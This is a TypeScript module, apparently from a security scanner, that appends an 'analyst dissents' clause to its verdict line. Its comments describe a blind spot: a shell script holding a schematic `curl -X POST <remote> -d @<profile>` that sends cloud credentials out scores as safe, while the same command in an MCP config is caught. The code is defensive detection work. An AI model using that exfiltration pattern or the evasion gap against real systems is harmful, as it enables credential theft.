/**
 * The verdict line says when the analyst dissents.
 *
 * A shell script whose only purpose is exfiltrating the local cloud credential
 * profile to a remote host scores **100/100, "No security issues detected.
 * This library looks safe to use.", exit 0** — measured 2026-08-23 on
 * `8c767f6`, one `.sh` holding a single `curl -X POST <remote> -d @<profile>`
 * beside a complete `.gitignore`.
 *
 * The deterministic checks have nothing to say about it: they key on
 * credentials *present* in a file, not on a command that *steals* them.
 *
 * Do NOT cite the `.mcp.json` form of this as the example. The same curl
 * inside an MCP server config IS caught — `"command":"sh"` plus `-c` fires a
 * CRITICAL `Remote Instruction Fetch`, 69/100, exit 1 — so the blind spot is
 * specific to artifact types the MCP rules do not cover, not to exfiltration
 * generally. An earlier draft of this file claimed the `.mcp.json` scored
 * 98/100 and was missed; it does not, and it is not.
 *
 * The analyst is the channel that can cover this class, because it reads
 * behaviour rather than shape. Its escalation is advisory and non-scoring by
 * release-gate ruling — the analyst carries a measured ~22% false-positive rate on
 * dual-use security code — so it renders in a footer well below a verdict
 * line that says the tree is fine.
 *
 * That design is deliberate and is NOT changed here. The score, the exit code
 * and the advisory-only contract are untouched; this module adds no channel
 * and suppresses none. The problem it closes is narrower: the verdict line
 * asserted a clean result while the tool was holding a high-severity dissent
 * it did not mention, and `98/100` is what a user reads as safe.
 *
 * `buildVerdict` lives in `@opena2a/cli-ui` (pinned `0.5.2`), not in this
 * repo, so the clause is composed in `cli.ts` rather than inside the renderer
 * — a cross-package release to add a suffix would be the more expensive half
 * of this change. Where in `cli.ts` is not a free choice; see below.
 *
 * Split out of `cli.ts` for the same reason as `unresolved-categories.ts`: so
 * the rule for which escalations count is exercisable without running a scan.
 *
 * That is the PURE half. The ORDERING half — that the clause must be appended
 * last — has no test, and three attempts to guard it by grepping `cli.ts` were
 * each defeated. It is reproducible end-to-end without a daemon or a model by
 * swapping the orchestrator export in `require.cache` and spawning
 * `dist/cli.js`; that is tracked in #560 and is the only thing that
 * closes the class.
 */

/**
 * The part of an analyst escalation this module reads.
 *
 * Deliberately two fields out of the nine on `AnalystEscalation`: the clause
 * counts files and nothing else, so `summary`, `attackClass`, `classification`
 * and `severity` — model-derived text produced while reading an
 * attacker-controlled artifact — are not in scope here and cannot reach the
 * verdict line through it.
 */
export interface DissentingEscalation {
  file: string;
  routed: 'attack' | 'abstain';
}

/**
 * Distinct files the analyst routed to `attack`.
 *
 * ATTACK ONLY, and that is the load-bearing half. `abstain` is the model
 * hedging or parser noise ("confidence: 0.15") on benign-but-security-shaped
 * content; those are hidden from the escalations footer by default for that
 * reason, and they must not reach the verdict line either. A verdict that
 * announced a "dissent" over a 0.15-confidence shrug would spend the line's
 * credibility on exactly the noise the abstention gate exists to absorb, and
 * the next real dissent would read as more of the same.
 *
 * Counted as distinct `file` STRINGS, because the rendered clause says "file".
 * Not distinct filesystem objects: `a.md` and `./a.md` are two here. That is
 * adequate only because the producer emits `relative()`-normalised paths, at
 * most one per selected candidate — a single `escalations.push` inside
 * `for (const candidate of selected)` in `nanomind-core/orchestrate.ts`, over
 * a candidate set partitioned by one `walkDir` in `scanner-bridge.ts`. Both
 * halves of that are load-bearing; if either changes, this counts wrong.
 *
 * The escalations footer is fed from this same function so its headline and
 * this clause cannot report different numbers for one scan.
 *
 * Returns paths, not a count, so a caller that wants to name them does not
 * have to re-derive the set from a different filter than the one the number
 * came from. Those paths are RAW — they come out of the scanned tree and are
 * attacker-influenced. Any caller that renders one must put it through
 * `escapePathForDisplay` first, as the footer does.
 */
export function dissentingFiles(
  escalations: readonly DissentingEscalation[] | undefined,
): string[] {
  if (!Array.isArray(escalations) || escalations.length === 0) return [];
  const files = new Set<string>();
  for (const e of escalations) {
    // Per-element guard, not just a per-array one. The field is typed `any[]`
    // at the call site, so nothing upstream is holding this shape for us.
    //
    // Scope, stated because the stronger claim is false: this does NOT make a
    // malformed escalation survivable. The footer still filters and still
    // dereferences `esc.file`, so a `null` element kills the run here exactly
    // as it did before this change. What the guard buys is that the throw
    // lands no EARLIER than it used to — without it, it moves up and takes the
    // Categories and Verdict lines with it.
    if (!e || e.routed !== 'attack') continue;
    files.add(typeof e.file === 'string' ? e.file : '');
  }
  return [...files];
}

/**
 * Clause appended to the verdict message when the analyst dissents.
 *
 * Empty string when it does not, so the caller appends unconditionally and
 * the no-dissent line stays byte-identical — same contract as
 * `clampDisclosure` in `verdict-band.ts`.
 *
 * The clause carries a COUNT and a section name, never a path. Escalation
 * `file` values come out of the scanned tree and are attacker-influenced;
 * the footer escapes them with `escapePathForDisplay` before printing a row.
 * Naming a file here would put a second, differently-escaped copy of a
 * tree-derived path on HMA's most-read line — so this one points at the
 * section that already renders them safely instead.
 */
export function analystDissentSuffix(
  escalations: readonly DissentingEscalation[] | undefined,
): string {
  const count = dissentingFiles(escalations).length;
  if (count === 0) return '';
  return ` (analyst dissents on ${count} file${count === 1 ? '' : 's'} — see NanoMind Coverage Escalations)`;
}

/**
 * WHERE THIS GETS APPENDED, and why it is not obvious.
 *
 * `composeVerdictLine` below applies it to the RENDERED Verdict line, after
 * the two disclosure verdicts — not to `buildVerdict`'s `message`, which is
 * the intuitive place and is wrong.
 *
 * `renderObservationsBlock` copies `verdict.message` into the `Verdict` line's
 * `value`, and two branches downstream then ASSIGN that value outright rather
 * than appending to it: the coverage-gap disclosure ("No issues in what was
 * examined — but …") and the #200 quick-scan disclosure. Both are gated on
 * `totalFindings === 0`.
 *
 * That gate is the problem. Escalations are advisory and never counted into
 * findings, so `totalFindings === 0` is precisely the scan where a dissent is
 * the ONLY adverse signal in the output — and a clause composed onto
 * `message` upstream is silently deleted there, in the one case it exists for.
 *
 * Which of the two actually bites, measured rather than assumed:
 *
 * - COVERAGE-GAP: live. `secure` passes escalations and reaches this branch —
 *   it fires on hackmyagent's own self-scan ("but 7 stopped at a file cap").
 *   This one is why the ordering is not negotiable.
 * - QUICK-SCAN: defensive only, today. Its sole trigger is the `check
 *   skill:`/`check mcp:` call site, and that call site passes no
 *   `analystEscalations` at all, so a dissent and this branch cannot currently
 *   co-occur. Do not cite it as evidence the ordering is needed; it is here
 *   because wiring escalations into `check` would silently re-open the hole.
 */
export type VerdictTone = 'default' | 'good' | 'warning' | 'critical';

export interface VerdictLineInput {
  /** The `Verdict` line as `renderObservationsBlock` built it. */
  base: { value: string; tone: VerdictTone };
  /** #200 — the quick-scan disclosure for a zero-finding quick scan. Replaces the value. */
  quickScanVerdict?: string;
  /** The coverage-gap disclosure for a zero-finding scan over incomplete coverage. Replaces the value. */
  coverageGapVerdict?: string;
  /**
   * #568 — the clause naming an input the run could not read. PREPENDED to
   * whichever sentence the two disclosures leave, so the line leads with it.
   * The caller leaves it unset for a fail-direction band, whose own lead is
   * already stronger.
   */
  incompleteLead?: string;
  escalations: readonly DissentingEscalation[] | undefined;
}

/**
 * #560 — the Verdict line's final text and tone, composed in one pure step so
 * the ORDER above is a property a test can call rather than a comment in
 * `cli.ts`. The two disclosures assign (coverage-gap wins when both apply, as
 * it ran second), then the #568 incomplete-input lead is prepended, then the
 * dissent clause is appended, then the tone comes off green if a lead or a
 * clause was added.
 *
 * The tone rule only DOWNGRADES, and only from `good`: the advisory channel may
 * withdraw an all-clear it disagrees with, never soften a `warning` or
 * `critical` verdict into something calmer.
 *
 * Neither score nor exit code reads the result.
 */
export function composeVerdictLine(input: VerdictLineInput): { value: string; tone: VerdictTone } {
  let { value, tone } = input.base;
  if (input.quickScanVerdict !== undefined) {
    value = input.quickScanVerdict;
    tone = 'warning';
  }
  if (input.coverageGapVerdict !== undefined) {
    value = input.coverageGapVerdict;
    tone = 'warning';
  }
  if (input.incompleteLead !== undefined) {
    value = `${input.incompleteLead} ${value}`;
    if (tone === 'good') tone = 'warning';
  }
  const dissent = analystDissentSuffix(input.escalations);
  value += dissent;
  if (dissent !== '' && tone === 'good') tone = 'warning';
  return { value, tone };
}
